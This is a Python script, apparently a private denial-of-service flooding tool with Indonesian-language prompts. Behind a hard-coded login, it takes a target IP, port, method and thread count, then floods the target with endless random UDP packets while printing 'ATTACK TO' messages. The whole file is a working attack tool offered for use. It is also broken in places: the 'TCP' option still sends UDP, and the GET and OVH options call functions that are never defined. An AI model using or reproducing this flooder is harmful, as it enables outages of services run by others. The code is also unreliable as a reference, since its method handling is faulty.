#TOOL BY DERZ
import os
import codecs
import sys
import random
import threading
import time
import socket
from time import time as tt

os.system("clear")


print("""
\033[0;32m _                         
\033[0;32m( )                _       
\033[0;32m| |      _     __ (_) ___  
\033[0;32m| |  _ / _ \ / _  \ |  _  \\
\033[0;32m| |_( ) (_) ) (_) | | ( ) |
\033[0;32m(____/ \___/ \__  |_)_) (_)
\033[0;32m            ( )_) |        
\033[0;32m             \___/         
""")

username = str(input("Username:"))
password = str(input("Password:"))
if password == "DerZPrivite" and username == "DerZPrivite":
    print ("Telah Masuk Sebagai DeaXs")
    time.sleep(0.2)

else:
    print ("Passwordnya Salah Bruh.")
    time.sleep(999999999999999999999999999)
    
os.system("clear")
print("\033[92mConnecting To Server [\033[97m•\033[92m]")
time.sleep(0.5)


nicknm = "DeaXS"

mt = """\033[96mUnder \033[0;93mmaintance"""

os.system("clear")

print("""\033[95m
██████╗░███████╗██████╗░███████╗
██╔══██╗██╔════╝██╔══██╗╚════██║
██║░░██║█████╗░░██████╔╝░░███╔═╝
██║░░██║██╔══╝░░██╔══██╗██╔══╝░░
██████╔╝███████╗██║░░██║███████╗
╚═════╝░╚══════╝╚═╝░░╚═╝╚══════╝""")

print("\033[95m>> CODED : DerZ. ") 
print("\033[95m>>> Coded Campuran By : DerZ") 
print("\033[95m>>>> TOOLS PRIVATE DERZ")
print("\033[91m                                       METODE: UDP-TCP-GET-OVH              ")
ip = str(input("  \033[0;31mIP:"))
port = int(input(" \033[0;32mPort:"))
choice = str(input(" \033[94mMethods: "))
times = int(input(" \033[0;31mPacket:"))
threads = int(input(" \033[0;32mThreads:"))
os.system("clear")
time.sleep(0.1)

def run():
	data = random._urandom(1025)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(f"\033[91m[•] ATTACK TO \033[97m{ip} \033[91mPORT \033[97m{port}\033[91m!!!")
		except:
			print(f"\033[91m[×] ATTACK TO \033[97m{ip} \033[91mPORT \033[97m{port}\033[91m!!!")

def run2():
	data = random._urandom(1025)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(f"\033[91m[•] ATTACK TO \033[97m{ip} \033[91mPORT \033[97m{port}\033[91m!!!")
		except:
			print(f"\033[91m[×] ATTACK TO \033[97m{ip} \033[91mPORT \033[97m{port}\033[91m!!!")

def run3():
	data = random._urandom(1025)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(f"\033[91m[•] ATTACK TO \033[97m{ip} \033[91mPORT \033[97m{port}\033[91m!!!")
		except:
			print(f"\033[91m[×] ATTACK TO \033[97m{ip} \033[91mPORT \033[97m{port}\033[91m!!!")

for y in range(threads):
	if choice == 'UDP':
		th = threading.Thread(target = run)
		th.start()
		th = threading.Thread(target = run2)
		th.start()
		th = threading.Thread(target = run3)
		th.start()
	if choice == 'udp':
		th = threading.Thread(target = run)
		th.start()
		th = threading.Thread(target = run2)
		th.start()
		th = threading.Thread(target = run3)
		th.start()
	if choice == 'TCP':
		th = threading.Thread(target = run)
		th.start()
		th = threading.Thread(target = run2)
		th.start()
	if choice == 'tcp':
		th = threading.Thread(target = run)
		th.start()
		th = threading.Thread(target = run2)
		th.start()
	if choice == 'GET':
		th = threading.Thread(target = run4)
		th.start()
		th = threading.Thread(target = run5)
		th.start()
	if choice == 'get':
		th = threading.Thread(target = run4)
		th.start()
		th = threading.Thread(target = run5)
		th.start()
	if choice == 'OVH':
		th = threading.Thread(target = run4)
		th.start()
		th = threading.Thread(target = run5)
		th.start()
	if choice == 'ovh':
		th = threading.Thread(target = run4)
		th.start()
		th = threading.Thread(target = run5)
		th.start()
else:
		th = threading.Thread(target = run)
		th.start()
		th = threading.Thread(target = run2)
		th.start()
		th = threading.Thread(target = run3)
		th.start()